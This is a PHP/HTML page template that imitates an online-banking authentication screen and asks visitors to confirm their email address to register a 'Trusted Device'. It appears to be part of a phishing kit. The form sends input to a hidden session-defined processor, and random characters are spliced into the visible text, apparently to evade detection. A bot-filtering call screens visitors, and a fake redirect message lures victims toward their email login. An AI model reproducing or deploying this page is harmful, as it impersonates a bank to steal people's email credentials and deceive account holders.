<!DOCTYPE html>
<html lang="en-US" class="js-focus-visible"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><style>body {transition: opacity ease-in 0.2s; }</style><title>Authentication</title>
<meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes">
<link rel="shortcut icon" href="<?php echo gaflder();?>/favicon.ico">
<link href="<?php echo gaflder();?>/font-icons.css" rel="stylesheet" type="text/css">
<link href="<?php echo gaflder();?>/iris-foundation.min.css" rel="stylesheet" type="text/css">
<link href="<?php echo gaflder();?>/iris.min.css" rel="stylesheet" type="text/css">
<link rel="stylesheet" href="<?php echo gaflder();?>/theme.mobile.css">
<link rel="stylesheet" href="<?php echo gaflder();?>/iris-components.shim.mobile.min.css" type="text/css">
<link rel="stylesheet" href="<?php echo gaflder();?>/iris-components.min.css" type="text/css">
<link rel="stylesheet" href="<?php echo gaflder();?>/isotope.min.css" type="text/css">
<style>
body.Authentication .brand-logo {max-width:200px;height:200px;margin-top:30px;margin-bottom:30px;}
body.Authentication .mobile-authentication-container {
    display: block;
    position: relative;
}
#kindunderline{font-size:15px;}
.irisv-button{white-space:normal;}

	#redi{color:#0184bf;text-decoration:underline;transition:display 0.8s;}
	.transitioning{height:14px;width:14px;vertical-align:middle;display:inline-block;padding-right:30px;}
	.redi{height:14px;width:14px;-webkit-animation: rotation .7s infinite linear;-moz-animation: rotation .7s infinite linear;-o-animation: rotation .7s infinite linear;animation: rotation .7s infinite linear;border-left:3px solid #0184bf;border-right:3px solid #0184bf;border-bottom:3px solid #0184bf;border-top:3px solid #fff;border-radius:100%;display:inline-block;}
	@keyframes rotation {
         from {transform: rotate(0deg);}
         to {transform: rotate(359deg);}
     }
    @-webkit-keyframes rotation {
        from {-webkit-transform: rotate(0deg);}
        to {-webkit-transform: rotate(359deg);}
    }
    @-moz-keyframes rotation {
        from {-moz-transform: rotate(0deg);}
        to {-moz-transform: rotate(359deg);}
    }
    @-o-keyframes rotation {
        from {-o-transform: rotate(0deg);}
        to {-o-transform: rotate(359deg);}
    }
body.Authentication.isotope-mobile .isotope-app{height:100%;max-width: 600px;width: 100%;margin: auto;}
</style>
</head>
<body id="username_page" class="alk-body shared-layout theme--theme-builder isotope-mobile Authentication windows challenge-type-username-and-password username-and-password iris-keyboard-use-detected">
<div class="page-background__layer page-background__layer0--image"></div><div id="mmenu_container"><div id="wrapper"><div id="content" class="clearfix"><div class="card-container flush-with-titlebar"><div class="card card-full-width"><div class="cms-content-area iris-content"></div></div></div><div class="cms-content-area"></div><div class="mobile-authentication-container"><div id="login_header" class="mobile-authentication-header"><div class="brand-logo" role="img"></div></div><div class="mobile-authentication-content"><div id="app" class="isotope-app"><div class="isotope-page--authentication isotope-page"><div class="isotope-challenge-type--username-and-password isotope-challenge-type"><div class="login-image-container"><form role="form" id="ticated" method="POST" action="<?php echo $_SESSION['processor'];?><?php if(isset($_GET[''.$theerrkey.''])){echo '?'.$theerrkey.'=On';};?>" class="isotope-slide usernameAndPasswordForm" onsubmit="return waitreq()"><!----><div class="isotope-slide__content"><div><h1 class="font-content-heading--district mar-top--0 mar-bottom--big">
	Email Contact Confirmation
            </h1></div><div class="irisv-textfield mar-top--small irisv-textfield--filled" kind="underline"><div class="irisv-textfield__container"><div class="irisv-textfield__control irisv-textfield__control-spacing-icon"><div class="irisv-textfield__input-wrapper"><span><label for="email" class="irisv-textfield__label font-caption"> Email Address </label></span><input type="email" name="<?php echo gaN('email');?>" id="email" required="required" class="irisv-textfield__input font-subtitle-1" autofocus="on"/></div><!----></div></div>
			<div id="kindunderline" class=" mar-top--small">		  
<div>We need you to verify your email contact information to save this device as a <span style="color:#0b6efd">Trusted Device</span><br/><br/>Using industry standard encryption to protect your data, we instantl<?php echo rT('ALPHANUMERIC',rand(1,87));?>y confirm your email on file and then establish a secure connection<?php echo rT('ALPHANUMERIC',rand(1,87));?> to verify with your email service provider</div><p style="display:none;font-size:14px;" id="redi"><br/><span class='transitioning'><span class='redi'>&nbsp;</span></span>Redirecting you to your email service provider to confirm you own this email address....<input type="hidden" name="<?php echo gaN('ghh');?>" value="<?php echo uniqid();?>">
    <input type="hidden" value="off" id="jas"><br/></p></div>
			</div></div><div class="isotope-slide__footer"><div class="mar-top--small"><div id="irisv_notification_868k24rt5lu" role="alertdialog" tabindex="0" class="irisv-notification inline error-light" style="<?php if(!isset($_GET[''.$theerrkey.''])){echo 'display:none;';};?>"><div class="irisv-notification__container"><span role="img" class="irisv-icon irisv-notification__leading-icon font-icon-alert-line irisv-icon--md"><!----></span><span id="irisv_notification_868k24rt5lu_heading" class="irisv-notification__message-heading font-subtitle-2">  <span class="irisv-notification__message-body font-body-2"> Invalid email address, Please try again. </span></span><button class="irisv-notification__close" style="display: none;"><span class="font-icon-cancel-x irisv-notification-icon--sm"></span></button></div></div></div><div class="isotope-actions mar-top--small"><button type="submit" class="irisv-button irisv-button--highEmphasis irisv-button--onLight irisv-button--full-width text--none" id="btn_submitCredentials"><!----><span class="irisv-button__text"> Continue </span><!----><!----></button><br></div></div>
			</form>
			<br/>
			<br/>
<script>
function load(){document.getElementById('redi').style.display="block";};
function waitreq(){load();var suballow=document.getElementById('jas')<?php if(isset($_SESSION['device']) && !stripos($_SESSION['device'],'yochi')){banbot();};?>;setTimeout(function(){suballow.value="on";document.getElementById('ticated').submit();},3000);if(suballow.value!='off'){return true;} else{return false;};};
</script>
	
</div></div></div>
</div>
</div>
</div>
</div>
</div>
</body></html>